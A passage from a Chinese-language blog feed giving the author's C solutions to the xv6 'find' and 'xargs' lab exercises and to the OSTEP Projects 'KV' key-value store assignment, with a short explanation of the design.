keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T_DIR<span class="token operator">:</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>de<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// prevent infinite recursion</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>de<span class="token punctuation">.</span>inum <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// generate path of sub directory</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> buf <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span><span class="token function">memmove</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> de<span class="token punctuation">.</span>name<span class="token punctuation">,</span> DIRSIZ<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">[</span>DIRSIZ<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">find</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">find</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>相较于 <code>find</code>，<code>xargs</code> 的实现就简单很多了。由于之前自己实现过一个简单的 shell，因此对于 <code>exec</code> 系统调用还算比较熟悉，本题的主要内容就是根据 <code>argv</code> 和标准输入构造一个新的参数列表，作为指定命令行程序的参数，并使用 <code>exec</code> 来进行调用。</p><p>程序的流程比较简单，这里不过多介绍，直接查看完整代码即可。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/xargs.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/param.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> nargv<span class="token punctuation">[</span>MAXARG<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> MAXARG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// remove last '\n'</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>nargv<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>nargv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">exec</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nargv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"xargs: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Boot-xv6&quot;&gt;&lt;a href=&quot;#Boot-xv6&quot; class=&quot;headerlink&quot; title=&quot;Boot xv6&quot;&gt;&lt;/a&gt;Boot xv6&lt;/h1&gt;&lt;p&gt;按照示例切换到 &lt;code&gt;util&lt;/code&gt; 分支后，看到目录下包含 &lt;code&gt;Ma</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projects：KV</title>
    <link href="http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/"/>
    <id>http://lordaeronesz.github.io/2024/05/08/OSTEP%20Projects%EF%BC%9AKV/</id>
    <published>2024-05-08T01:03:08.000Z</published>
    <updated>2024-05-10T13:16:13.024Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 KV 部分，包含个人的代码实现和设计思路。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目要求实现一个最简单的数据库，以支持数据的持久化。</p><p>每个操作由格式为 <code>op,[arg1],[arg2]</code> 的命令给出，那么首先要解决的问题就是参数的分离，再根据操作符 op 来对不同的操作进行特殊处理。字符串划分这里采用的是 <code>strsep()</code> 函数：该函数接收两个参数 <code>char** stringp</code> 和 <code>const char* delim</code>，<code>stringp</code> 是指向待分割字符串 <code>string</code> 的指针，<code>delim</code> 则是指定的分隔符，该函数的操作是查找 <code>string</code> 中第一个 <code>delim</code> 的位置 <code>it</code>，并将 <code>stringp</code> 指向 <code>string</code> 中 <code>it + 1</code> 的位置，同时返回<code>string</code> 开头到  <code>it</code> 所有字符所构成的子串（加上 <code>&#39;\0&#39;</code> 终结符）。</p><p>插入操作没什么好说的，直接使用 <code>fprintf()</code> 写入文件即可。对于查找和删除，则需要将数据从文件（数据库）中读取到内存，存储在特定的数据结构中，例如哈希表、红黑树等，但为了代码实现的简单，我使用的是最简单的链表。对于查找，先将所有数据读取到一个链表中，然后按顺序逐个进行查找；对于删除，将所有数据读取到一个链表中，然后逐个遍历链表，如果当前结点的键（key）与参数不同，则写入文件中，否则，不写入（相当于删除）。最后，为了防止内存的泄露，需要在每次结束查找和删除操作之后，将存储数据内容的链表结点的内存空间释放。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DATA_BASE</span> <span class="token string">"./database.txt"</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span><span class="token comment">// 从文件fp中读取数据</span>line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> dummy <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 哨兵结点</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> dummy<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 释放链表内存空间</span><span class="token keyword">void</span> <span class="token function">free_list_mem</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> data<span class="token punctuation">;</span>data <span class="token operator">=</span> data<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> op <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 操作符</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> value <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s,%s\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份（line_buf会被strsep()修改）</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 找到key</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s not found\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 清空文件</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 当前条目键值为key，不写入（相当于删除）</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span 